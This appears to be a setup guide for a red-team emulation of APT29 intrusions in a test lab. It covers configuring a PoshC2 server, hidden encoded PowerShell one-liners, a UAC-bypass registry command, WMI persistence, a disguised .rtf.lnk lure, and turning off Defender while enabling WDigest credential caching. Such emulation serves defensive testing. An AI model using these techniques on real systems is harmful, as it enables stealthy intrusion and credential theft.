# Scenario 2 Infrastructure

We hope to capture the general structure of what is reported to have been seen being used by APT29.  The infrastructure listed below is specific to Scenario 2.  The requirements described herein should be considered a bare minimum to execute the scenario.  If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc.  If you are not concerned with emulating APT29 to this degree, this level of effort is not necessary.  You could for instance, phish, serve payload, and exfil from/to the same server.

Please note that binary files hosted in [Scenario_1](/apt29/Resources/Scenario_1) and [Scenario_2](/apt29/Resources/Scenario_2) have been added to password protected zip files.  The password for these files is "malware."

---

## Emulation Team Infrastructure

1. Server running an offensive framework (we tested and executed using PoshC2 -- <https://github.com/nettitude/PoshC2>) capable of:
    - Executing native PowerShell commands
    - Loading and executing PowerShell scripts (.ps1)
    - Generating a DLL payload and an encoded PowerShell oneliner
    - Receiving and maintaining multiple callbacks at once
2. Online OneDrive Account (https://onedrive.live.com/)

---

## Emulation Team Infrastructure Configuration

#### A note about red team payloads

- Pre-compiled payloads are available in the [resources](/apt29/Resources) directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.

### Generate an encoded PowerShell oneliner payload, then copy:

1. Just the encoded portion (ex: `WwBTAH...=`) into `$enc_ps variable` (4th line from bottom) in [schemas.ps1](/apt29/Resources/Scenario_2/schemas.ps1)
    - ex: `$enc_ps = "WwBTAH...=="`
2. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `CommandLineTemplate` variable (under `$ConsumerArgs` in 2nd paragraph) in [stepFifteen_wmi.ps1](/apt29/Resources/Scenario_2/stepFifteen_wmi.ps1)
    - ex: `CommandLineTemplate="powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="`
3. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `-Value` variable (2nd line) in [stepFourteen_bypassUAC.ps1](/apt29/Resources/Scenario_2/stepFourteen_bypassUAC.ps1)
    - ex: `New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="`

#### Generate DLL payload, then on a separate Windows host:

1. [CMD] > `certutil -encode [file].dll blob`
2. [CMD] > `powershell`
3. [PS] > `$blob = (Get-Content .\blob) -join ""; $blob > .\blob`
4. Open `blob` file in text editor
5. Delete new line at end of file and copy all (CTRL-A, CTRL-C)
6. Paste value (ex: `-----BEGIN CERTIFICATE-----...-----END CERTIFICATE-----`) into `$bin` variable (6th line) in `schemas.ps1`

#### Copy [payloads](/Resources/Scenario_2/) to C2 server (wherever is appropriate for your C2 framework to have access to these files)

#### Update [stepFourteen_credDump.ps1](/Resources/Scenario_2/stepFourteen_credDump.ps1) -- directions are in file

#### Prepare initial access payloads:

1. Login as non-domain admin user
2. Copy over the following files onto the Desktop of the initial victim:

   - [2016_United_States_presidential_election_-_Wikipedia.html](/apt29/Resources/Scenario_2/2016_United_States_presidential_election_-_Wikipedia.html)
   - [make_lnk.ps1](/apt29/Resources/Scenario_2/make_lnk.ps1)
   - [schemas.ps1](/apt29/Resources/Scenario_2/schemas.ps1)

3. Copy over [MITRE-ATTACK-EVALS.HTML](/apt29/Resources/Scenario_2/MITRE-ATTACK-EVALS.HTML) into the Documents folder of the initial victim
4. Execute `make_lnk.ps1` (Right click > Run with PowerShell), this will generate `37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk`
5. Drag `make_lnk.ps1` and `schemas.ps1` to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)

---

## Target Infrastructure

1. 3 targets
    - 1 domain controller and 2 workstations
    - All Windows OS (tested and executed against Win10 1903)
    - Domain joined with at least 2 accounts (domain admin and another user)
2. Microsoft Outlook must be available locally on one of the victim workstations

---

## Target Infrastructure Configuration

#### For each of the three targets:

1. Login in as domain admin user
2. Ensure Windows Defender is off or configured to alert-only (<https://support.microsoft.com/en-us/help/4027187/windows-10-turn-off-antivirus-protection-windows-security>)
3. Change network type to Domain (<https://www.itechtics.com/change-network-type-windows-10/#2-_Setting_network_type_using_Windows_Registry>)
4. Set UAC to never notify (<https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10>)
5. Enable WinRM (<https://support.microsoft.com/en-us/help/555966>)
6. Enable UseLogonCredential in the WDigest Registry settings (<https://support.microsoft.com/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a>)

#### For the initial target (the workstation with Microsoft Outlook):

1. Login as non-domain admin user
2. Enable programatic access to Microsoft Outlook (<https://www.slipstick.com/developer/change-programmatic-access-options/>)
3. Open Outlook and sign in if necessary

---

## Additional Plan Resources

- [Intelligence Summary](/apt29/Intelligence_Summary.md)
- [Operations Flow](/apt29/Operations_Flow.md)
- [Emulation Plan](/apt29/Emulation_Plan/README.md)
  - [Scenario 1 - Infrastructure](/apt29/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1](/apt29/Emulation_Plan/Scenario_1/README.md)
  - [Scenario 2 - Infrastructure](/apt29/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2](/apt29/Emulation_Plan/Scenario_2/README.md)
  - [YAML](/apt29/Emulation_Plan/yaml)
- [Archive](/apt29/Archive)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/apt29/CHANGE_LOG.md)
